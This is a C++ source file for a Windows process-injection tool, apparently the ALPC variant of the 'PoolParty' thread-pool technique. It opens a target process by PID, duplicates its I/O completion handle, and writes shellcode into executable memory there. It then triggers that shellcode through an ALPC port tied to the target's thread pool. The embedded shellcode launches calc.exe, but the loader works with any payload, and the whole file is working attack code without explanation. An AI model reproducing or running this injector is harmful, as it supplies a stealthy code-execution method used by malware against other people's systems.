#include <Windows.h>
#include <iostream>
#include <vector>
#include <winternl.h>

#include "ThreadPool.h"
#include "WorkerFactory.h"
#include "Native.h"

#pragma comment(lib, "ntdll")

#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }

EXTERN_C
NTSTATUS NTAPI NtAlpcCreatePort(
	_Out_ PHANDLE PortHandle,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes
);

EXTERN_C
NTSTATUS NTAPI TpAllocAlpcCompletion(
	_Out_ PFULL_TP_ALPC* AlpcReturn,
	_In_ HANDLE AlpcPort,
	_In_ PTP_ALPC_CALLBACK Callback,
	_Inout_opt_ PVOID Context,
	_In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron
);

EXTERN_C
NTSTATUS NTAPI NtAlpcSetInformation(
	_In_ HANDLE PortHandle,
	_In_ ULONG PortInformationClass,
	_In_opt_ PVOID PortInformation,
	_In_ ULONG Length
);

EXTERN_C
NTSTATUS NTAPI NtAlpcConnectPort(
	_Out_ PHANDLE PortHandle,
	_In_ PUNICODE_STRING PortName,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes,
	_In_ DWORD ConnectionFlags,
	_In_opt_ PSID RequiredServerSid,
	_In_opt_ PPORT_MESSAGE ConnectionMessage,
	_Inout_opt_ PSIZE_T ConnectMessageSize,
	_In_opt_ PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes,
	_In_opt_ PALPC_MESSAGE_ATTRIBUTES InMessageAttributes,
	_In_opt_ PLARGE_INTEGER Timeout
);

unsigned char g_Shellcode[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";

int main(int argc, char* argv[])
{
	HANDLE hTargetProcess = nullptr;
	HANDLE hTpWorkFactory = nullptr;
	DWORD TargetPID = 0;

	TargetPID = atoi(argv[1]);
	//TargetPID = 1111;

	hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		printf("[-] OpenProcess failed: 0x%08X\n", GetLastError());
		return 1;
	}

	printf("[+] Opened a remote handle to the target process %d: 0x%p\n", TargetPID, hTargetProcess);

	// Duplicate I/O completion handle from the targer process

	ULONG InformationLength = 0;
	auto status = 0x0;
	std::vector<BYTE> Information;

	do {
		Information.resize(InformationLength);
		status = NtQueryInformationProcess(hTargetProcess, (PROCESSINFOCLASS)51, Information.data(), InformationLength, &InformationLength);
	} while (status == 0xffffffffc0000004);

	if (status != 0x0) {
		printf("[-] NtQueryInformationProcess failed.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	const auto pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information.data());

	HANDLE hDuplicatedObject = INVALID_HANDLE_VALUE;
	std::vector<BYTE> pObjectInformation;
	PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

	for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {

		BOOL bResult = DuplicateHandle(hTargetProcess, pProcessHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedObject, IO_COMPLETION_ALL_ACCESS, FALSE, NULL);

		if (bResult == 0x0) {
			printf("[-] DuplicateHandle failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		ULONG InformationLen = 0;
		do {

			pObjectInformation.resize(InformationLen);
			status = NtQueryObject(hDuplicatedObject, (OBJECT_INFORMATION_CLASS)2, pObjectInformation.data(), InformationLen, &InformationLen);

		} while (status == 0xffffffffc0000004);

		if (status != 0x0) {
			printf("[-] NtQueryObject failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

		printf("\t\t%ls - 0x%p\n", (wchar_t*)pObjectTypeInformation->TypeName.Buffer, hDuplicatedObject);

		if (wcscmp(L"IoCompletion", pObjectTypeInformation->TypeName.Buffer) == 0) {
			printf("[+] Duplicated a I/O completion handle handle: 0x%p\n", hDuplicatedObject);
			break;
		}

		continue;
	}

	if (hDuplicatedObject == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to duplicate I/O completion handle.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	// 03 - Allocate shellcode memory in the targer process

	PVOID ShellCodeAddress = nullptr;
	ShellCodeAddress = VirtualAllocEx(hTargetProcess, nullptr, sizeof(g_Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ShellCodeAddress == nullptr) {
		printf("[-] VritualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Allocated shellcode memory to the target process: 0x%p\n", ShellCodeAddress);

	// 04 - Write shellcode in the targer process

	BOOL bResult = WriteProcessMemory(hTargetProcess, ShellCodeAddress, g_Shellcode, sizeof(g_Shellcode), nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Written shellcode to the target process.\n");

	// 05 - Create a temporary ALPC port

	HANDLE hTempAlpcConnectionPort = nullptr;

	status = NtAlpcCreatePort(&hTempAlpcConnectionPort, nullptr, nullptr);
	
	if (status != 0x0)
	{
		printf("[-] NtAlpcCreatePort failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Created a temporary ALPC port: 0x%p\n", hTempAlpcConnectionPort);

	PFULL_TP_ALPC pTpAlpc = { 0 };
	status = TpAllocAlpcCompletion(&pTpAlpc, hTempAlpcConnectionPort, (PTP_ALPC_CALLBACK)ShellCodeAddress, nullptr, nullptr);

	if (status != 0x0)
	{
		printf("[-] TpAllocAlpcCompletion failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(L"\\RPC Control\\PoolPartyALPCPort");

	OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
	AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	AlpcObjectAttributes.ObjectName = &usAlpcPortName;

	ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;


	HANDLE hAlpcConnectionPort = nullptr;

	status = NtAlpcCreatePort(&hAlpcConnectionPort, &AlpcObjectAttributes, &AlpcPortAttributes);
	if (status != 0x0)
	{
		printf("[-] NtAlpcCreatePort failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	PFULL_TP_ALPC pRemoteTpAlpc = (PFULL_TP_ALPC)VirtualAllocEx(hTargetProcess, nullptr, sizeof(FULL_TP_ALPC), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteTpAlpc == nullptr) {
		printf("[-] VritualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	bResult = WriteProcessMemory(hTargetProcess, pRemoteTpAlpc, pTpAlpc, sizeof(FULL_TP_ALPC), nullptr);
	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCompletionPort = { 0 };
	AlpcPortAssociateCompletionPort.CompletionKey = pRemoteTpAlpc;
	AlpcPortAssociateCompletionPort.CompletionPort = hDuplicatedObject;

	status = NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCompletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
	if (status != 0x0)
	{
		printf("[-] NtAlpcSetInformation failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	OBJECT_ATTRIBUTES AlpcClientObjAttributes = { 0 };
	AlpcClientObjAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	const std::string Buffer = "Hello there!";
	const auto BufferLength = Buffer.length();

	ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);
	auto szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

	LARGE_INTEGER liTimeout = { 0 };
	liTimeout.QuadPart = -10000000;


	HANDLE hAlpc;
	status = NtAlpcConnectPort(
		&hAlpc,
		&usAlpcPortName,
		&AlpcClientObjAttributes,
		&AlpcPortAttributes,
		0x20000,
		nullptr,
		(PPORT_MESSAGE)&ClientAlpcPortMessage,
		&szClientAlpcPortMessage,
		nullptr,
		nullptr,
		&liTimeout);

	if (status != 0x0) {
		printf("[-] NtAlpcConnectPort failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}
	
	printf("[+] Done!\n");
	CloseHandle(hTargetProcess);
	CloseHandle(hDuplicatedObject);
	return 0;
}
